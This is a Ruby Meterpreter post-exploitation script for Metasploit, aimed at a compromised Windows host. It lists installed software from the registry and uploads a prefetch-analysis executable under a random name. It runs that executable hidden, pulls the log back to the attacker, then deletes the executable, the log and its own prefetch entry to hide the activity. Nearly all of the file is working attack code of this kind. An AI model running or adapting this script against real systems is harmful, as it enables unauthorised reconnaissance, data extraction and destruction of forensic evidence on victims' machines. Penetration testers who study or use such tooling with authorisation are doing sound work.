#Meterpreter script for extracting information from windows prefetch folder
#Provided by Milo at keith.lee2012[at]gmail.com
#Verion: 0.1.0

require 'fileutils'
require 'net/http'
require 'digest/sha1'

@session = client
@host,@port = @session.session_host, session.session_port

# Script Options
@@exec_opts = Rex::Parser::Arguments.new(
  "-h" => [ false,  "Help menu."],
  "-p" => [ false,  "List Installed Programs"],
  "-c" => [ false,  "Disable SHA1/MD5 checksum"],
  "-x" => [ true,   "Top x Accessed Executables (Based on Prefetch folder)"],
  "-i" => [ false,  "Perform lookup for software name"],
  "-l" => [ false,  "Download Prefetch Folder Analysis Log"]
)

@tempdir = @session.sys.config.getenv('TEMP')

#---------------------------------------------------------------------------------------------------------
def read_program_list
  key = @session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', KEY_READ)
  sfmsvals = key.enum_key
  sfmsvals.each do |test1|
    begin
      key2 = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\"+test1
      root_key2, base_key2 = @session.sys.registry.splitkey(key2)
      value1 = "DisplayName"
      value2 = "DisplayVersion"
      open_key = @session.sys.registry.open_key(root_key2, base_key2, KEY_READ)
      v1 = open_key.query_value(value1)
      v2 = open_key.query_value(value2)
      print_status("#{v1.data}\t(Version:  #{v2.data})")
    rescue
    end
  end
end

def prefetch_dump(options, logging=false)

  lexe = File.join(Msf::Config.data_directory, "prefetch.exe")
  rexe = sprintf("%.5d",rand(100000)) + ".exe"
  rlog = sprintf("%.5d",rand(100000)) + ".txt"

  print_status("Uploading Prefetch-tool for analyzing Prefetch folder...")
  begin
    @session.fs.file.upload_file("#{@tempdir}\\#{rexe}", lexe)
    print_status("Prefetch-tool uploaded as #{@tempdir}\\#{rexe}")
  rescue ::Interrupt; raise $!
  rescue ::Exception => e
    print_status("The following error was encountered: #{e.class} #{e}")
    return
  end

  begin

    if(logging)
      options += " --txt=#{@tempdir}\\#{rlog}"
    end

    r = @session.sys.process.execute("cmd.exe /c #{@tempdir}\\#{rexe} #{options} #{rlog}", nil, {'Hidden' => 'true','Channelized' => true})
    while(d = r.channel.read)
      d.split("\n").each do |out|
        print_status("OUT> #{out.strip}")
      end
    end

    found = true
    while (not found)
      found = false
      @session.sys.process.get_processes().each do |x|
        found = false
        if (x['name'].downcase == rexe)
          found = true
        end
      end
      sleep(0.5) if found
    end

    r.channel.close
    r.close

    print_status("Deleting #{rexe} from target...")
    @session.sys.process.execute("cmd.exe /c del #{@tempdir}\\#{rexe}", nil, {'Hidden' => 'true'})

    print_status("Clearing prefetch-tool prefetch entry ...")
    @session.sys.process.execute("cmd.exe /c del %windir%\\prefetch\\#{rexe.gsub('.exe','')}*.pf", nil, {'Hidden' => 'true'})

    if(logging)
      logfile = ::File.join(Msf::Config.config_directory, 'logs', 'prefetch', @host + "-" + ::Time.now.strftime("%Y%m%d.%M%S") + ".log")
      print_status("[*] Saving prefetch logs to #{logfile}...")
      @session.fs.file.download_file(logfile, "#{@tempdir}\\#{rlog}")
      print_status("[*] Deleting log file from target...")
      @session.sys.process.execute("cmd.exe /c del #{@tempdir}\\#{rlog}", nil, {'Hidden' => 'true'})
    end

  rescue ::Interrupt; raise $!
  rescue ::Exception => e
    print_status("The following error was encountered: #{e.class} #{e}")
    return
  end
end


#check for proper Meterpreter Platform
def unsupported
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end



################## MAIN ##################

options       = ""
logging       = false
view_list     = false
check_update  = false

@@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-x"
    options += " --x=" + val
  when "-c"
    options += " --disable-md5 --disable-sha1"
  when "-p"
    view_list = true
  when "-i"
    options += " --inet-lookup"
  when "-l"
    logging = true
  when "-h"
    print_status( "Prefetch-tool Meterpreter Script")
    print_line(@@exec_opts.usage)
    raise Rex::Script::Completed
  end
}
unsupported if client.platform !~ /win32|win64/i
prefetch_local = ::File.join(Msf::Config.data_directory, "prefetch.exe")

if !(::File.exist?(prefetch_local))
  print_status("No local copy of prefetch.exe, downloading from the internet...")
  Net::HTTP.start("prefetch-tool.googlecode.com") do |http|
    req  = Net::HTTP::Get.new("/files/prefetch.exe")
    resp = http.request(req)
    ::File.open(::File.join(Msf::Config.data_directory, "prefetch.exe"), "wb") do |fd|
      fd.write(resp.body)
    end
  end
  print_status("Downloaded prefetch.exe to #{prefetch_local}")
else
  print_status("Checking for an updated copy of prefetch.exe..")
  digest = Digest::SHA1.hexdigest(::File.read(prefetch_local, ::File.size(prefetch_local)))

  Net::HTTP.start("code.google.com") do |http|
    req     = Net::HTTP::Get.new("/p/prefetch-tool/downloads/detail?name=prefetch.exe&can=2&q=")
    resp    = http.request(req)
    body    = resp.body
    chksum  = body.scan(/SHA1 Checksum: <\/th><td style="white-space:nowrap">.* <a href/)[0]
    chksum.sub!(/SHA1 Checksum: <\/th><td style="white-space:nowrap"> /,'')
    chksum.sub!(/ <a href/,'')

    if (digest != chksum)
      print_status("Downloading an updated version of prefetch.exe to #{prefetch_local}...")
      Net::HTTP.start("prefetch-tool.googlecode.com") do |http|
        req  = Net::HTTP::Get.new("/files/prefetch.exe")
        resp = http.request(req)
        ::File.open(::File.join(Msf::Config.data_directory, "prefetch.exe"), "wb") do |fd|
          fd.write(resp.body)
        end
      end
      print_status("Downloaded prefetch.exe to #{prefetch_local}")
    end
  end
end

if (view_list)
  read_program_list()
end

print_status("Running Prefetch-tool script...")
prefetch_dump(options, logging)

